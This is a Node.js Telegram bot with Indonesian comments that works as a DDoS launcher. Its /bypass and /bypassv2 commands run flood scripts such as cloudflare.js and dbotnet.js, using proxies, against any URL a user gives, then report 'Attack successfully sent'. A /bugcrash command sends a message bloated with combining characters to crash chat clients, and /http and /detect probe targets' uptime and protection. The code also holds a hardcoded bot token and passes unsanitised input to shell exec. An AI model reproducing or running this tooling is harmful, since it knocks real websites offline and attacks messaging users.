const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const path = require("path");
const https = require("https");
const { detectProtection, formatResult } = require('./lib/detect.js');
// Ganti dengan token bot Telegram Anda
const token = '8528308125:AAFCCVDlNwozNco6kYzHm0aXSzjKiCstQvE';

// Inisialisasi bot dengan token
const bot = new TelegramBot(token, { polling: true });

// Fungsi untuk mencatat aktivitas penggunaan bot di console log
function logActivity(msg) {
  const user = msg.from;
  const chat = msg.chat;
  const command = msg.text.toLowerCase();

  console.log(`Aktivitas Penggunaan Bot Telegram`);
  console.log(`• User ID: ${user.id}`);
  console.log(`• Username: ${user.username || 'Tidak ada'}`);
  console.log(`• Chat ID: ${chat.id}`);
  console.log(`• Perintah: ${command}`);
}

// Event listener untuk pesan dari pengguna
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const command = msg.text.toLowerCase();

  // Mencatat aktivitas penggunaan bot di console log
  logActivity(msg);

if (command.startsWith('/start')) {
bot.sendMessage(chatId, `Author @XinyouXD

command
/bypass
/bypassv2
/tls
/detect
/http
/bugcrash`)
}
   
    if (command.startsWith('/bugcrash')) {
        bot.sendMessage(chatId, `👁️👁️
  👄✌️ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨۨ`)
    }
    

if (command.startsWith('/bypass')) {
  const args = command.split(' ');
  const url = args[1];
  const time = args[2];

  if (args.length === 3 && url && time) {
    const rate = 80;
    const thread = 10;
    const proxy = 'proxy.txt';

    const commands = [
      `node bypass.js ${url} ${time} ${rate} ${thread} ${proxy}`,
      `node gecko.js ${url} ${time} ${rate} ${thread} ${proxy}`,
      `node tlsarz.js ${url} ${time} ${rate} ${thread} ${proxy}`,
    ];

    commands.forEach((cmd) => {
      exec(cmd, { cwd: __dirname + '/lib' }, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);
      });
    });

    bot.sendMessage(chatId, 'Attack successfully sent');
  } else {
    bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /bypass [url] [time]');
  }
}
if (command.startsWith('/bypass')) {
  const args = command.split(' ');
  const url = args[1];
  const time = args[2];

  if (args.length === 3 && url && time) {
    const rate = 80;
    const thread = 10;
    const proxy = 'proxy.txt';

    const commands = [
      `node lauching.js ${url} ${time} ${rate} ${thread} ${proxy}`,
      `node raw.js ${url} ${time}`,
      `node httpx.js ${url} ${time} ${rate} ${thread} ${proxy}`,
    ];

    commands.forEach((cmd) => {
      exec(cmd, { cwd: __dirname + '/lib' }, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);
      });
    });

    bot.sendMessage(chatId, 'Attack successfully sent');
  } else {
    bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /tls [url] [time]');
  }
}

if (command.startsWith('/bypassv2')) {
  const args = command.split(' ');
  const url = args[1];
  const time = args[2];

  if (args.length === 3 && url && time) {
    const rate = 80;
    const thread = 10;
    const proxy = 'proxy.txt';

    const commands = [
      `node r9.js ${url} ${time} ${rate} ${thread} ${proxy}`,
      `node cloudflare.js ${url} ${time} ${rate} ${thread} ${proxy}`,
      `node dbotnet.js ${url} ${time} ${rate} ${thread} ${proxy}`,
    ];

    commands.forEach((cmd) => {
      exec(cmd, { cwd: __dirname + '/lib' }, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);
      });
    });

    bot.sendMessage(chatId, 'Attack successfully sent');
  } else {
    bot.sendMessage(chatId, 'Format pesan tidak benar. Gunakan format: /bypassv2 [url] [time]');
  }
}
  
if (command.startsWith('/http')) {
  const args = command.split(' ');
  const url = args[1];
  if (!url) {
    bot.sendMessage(chatId, 'Format: /http <url>\nContoh: /http https://example.com');
    return;
  }
  httpCheckHost(url, chatId, bot);
}
const NODES = [
  { flag: '🇦🇹', country: 'Austria', city: 'Vienna' },
  { flag: '🇧🇷', country: 'Brazil', city: 'Sao Paulo' },
  { flag: '🇧🇷', country: 'Brazil', city: 'Sao Paulo' },
  { flag: '🇧🇬', country: 'Bulgaria', city: 'Sofia' },
  { flag: '🇨🇦', country: 'Canada', city: 'Vancouver' },
  { flag: '🇨🇾', country: 'Cyprus', city: 'Larnaca' },
  { flag: '🇨🇿', country: 'Czechia', city: 'C.Budejovice' },
  { flag: '🇫🇮', country: 'Finland', city: 'Helsinki' },
  { flag: '🇫🇷', country: 'France', city: 'Paris' },
  { flag: '🇫🇷', country: 'France', city: 'Roubaix' },
  { flag: '🇩🇪', country: 'Germany', city: 'Frankfurt' },
  { flag: '🇩🇪', country: 'Germany', city: 'Nuremberg' },
  { flag: '🇭🇰', country: 'Hong Kong', city: 'Hong Kong' },
  { flag: '🇭🇺', country: 'Hungary', city: 'Nyiregyhaza' },
  { flag: '🇮🇳', country: 'India', city: 'Bengaluru' },
  { flag: '🇮🇩', country: 'Indonesia', city: 'Jakarta' },
  { flag: '🇮🇷', country: 'Iran', city: 'Tehran' },
  { flag: '🇮🇱', country: 'Israel', city: 'Netanya' },
  { flag: '🇮🇹', country: 'Italy', city: 'Milan' },
  { flag: '🇯🇵', country: 'Japan', city: 'Tokyo' },
  { flag: '🇰🇿', country: 'Kazakhstan', city: 'Karaganda' },
  { flag: '🇱🇹', country: 'Lithuania', city: 'Vilnius' },
  { flag: '🇲🇩', country: 'Moldova', city: 'Chisinau' },
  { flag: '🇳🇱', country: 'Netherlands', city: 'Amsterdam' },
  { flag: '🇵🇱', country: 'Poland', city: 'Poznan' },
  { flag: '🇵🇹', country: 'Portugal', city: 'Viana' },
  { flag: '🇷🇴', country: 'Romania', city: 'Bucharest' },
  { flag: '🇷🇺', country: 'Russia', city: 'Moscow' },
  { flag: '🇷🇸', country: 'Serbia', city: 'Belgrade' },
  { flag: '🇸🇬', country: 'Singapore', city: 'Singapore' },
  { flag: '🇸🇮', country: 'Slovenia', city: 'Maribor' },
  { flag: '🇰🇷', country: 'South Korea', city: 'Seoul' },
  { flag: '🇪🇸', country: 'Spain', city: 'Madrid' },
  { flag: '🇸🇪', country: 'Sweden', city: 'Stockholm' },
  { flag: '🇨🇭', country: 'Switzerland', city: 'Zurich' },
  { flag: '🇹🇷', country: 'Turkey', city: 'Istanbul' },
  { flag: '🇬🇧', country: 'UK', city: 'Coventry' },
  { flag: '🇺🇦', country: 'Ukraine', city: 'Kyiv' },
  { flag: '🇺🇸', country: 'USA', city: 'Dallas' },
  { flag: '🇺🇸', country: 'USA', city: 'Los Angeles' },
  { flag: '🇺🇸', country: 'USA', city: 'Miami' },
  { flag: '🇻🇳', country: 'Vietnam', city: 'Ho Chi Minh City' }
];

async function httpCheckHost(url, chatId, bot) {
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    url = 'http://' + url;
  }

  try {
    // KIRIM PESAN "Wait until it's finished.." LANGSUNG
    await bot.sendMessage(chatId, `Wait until it's finished..`);

    // Submit ke check-host.net
    const submit = await axios.get('https://check-host.net/check-http', {
      params: { host: url },
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });

    const requestId = submit.data.request_id;
    if (!requestId) throw new Error('Gagal mendapat request ID');

    // Polling hasil setiap 2 detik
    let result = null;
    let attempts = 0;
    while (!result && attempts < 30) {
      await new Promise(r => setTimeout(r, 2000));
      const response = await axios.get(`https://check-host.net/check-result/${requestId}`, {
        headers: { 'User-Agent': 'Mozilla/5.0' }
      });
      const data = response.data;
      
      // Cek apakah semua node udah merespon
      let allDone = true;
      for (const node in data) {
        if (!data[node] || !data[node][0]) {
          allDone = false;
          break;
        }
      }
      if (allDone && Object.keys(data).length > 0) {
        result = data;
        break;
      }
      attempts++;
    }

    if (!result) throw new Error('Timeout menunggu hasil');

    // Format output (TANPA MENULIS "Wait until" LAGI)
    let output = `HTTP-Check: ${url}\n\n`;
    
    const nodeKeys = Object.keys(result).sort();
    for (let i = 0; i < Math.min(nodeKeys.length, NODES.length); i++) {
      const nodeKey = nodeKeys[i];
      const nodeData = result[nodeKey];
      const nodeInfo = NODES[i];
      
      if (nodeData && nodeData[0]) {
        const res = nodeData[0];
        const status = res.code || '???';
        const time = res.time ? Math.round(res.time) : '?';
        const desc = res.description || '';
        output += `${nodeInfo.flag} ${nodeInfo.country}, ${nodeInfo.city} - ${status} - ${time}ms - ${desc}\n`;
      } else {
        output += `${nodeInfo.flag} ${nodeInfo.country}, ${nodeInfo.city} - Gagal - ?ms - Node error\n`;
      }
    }

    const encoded = encodeURIComponent(url);
    output += `\nSALIN KODE\n\n`;
    output += `Check Online: https://check-host.net/check-http?host=${encoded}\n`;
    output += `Full Report: https://check-host.net/check-report/${requestId}`;

    // Kirim hasil (pesan baru, tanpa menghapus pesan "Wait until")
    bot.sendMessage(chatId, output);
  } catch (error) {
    console.error('Error:', error);
    bot.sendMessage(chatId, `❌ Gagal: ${error.message}`);
  }
}

bot.onText(/^\/detect (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1].trim();

  const waitMsg = await bot.sendMessage(chatId, '⏳ Scanning website...');

  try {
    const result = await detectProtection(url);
    const output = formatResult(result);

    await bot.deleteMessage(chatId, waitMsg.message_id);
    await bot.sendMessage(chatId, output, { parse_mode: 'Markdown' });
  } catch (err) {
    await bot.deleteMessage(chatId, waitMsg.message_id);
    await bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});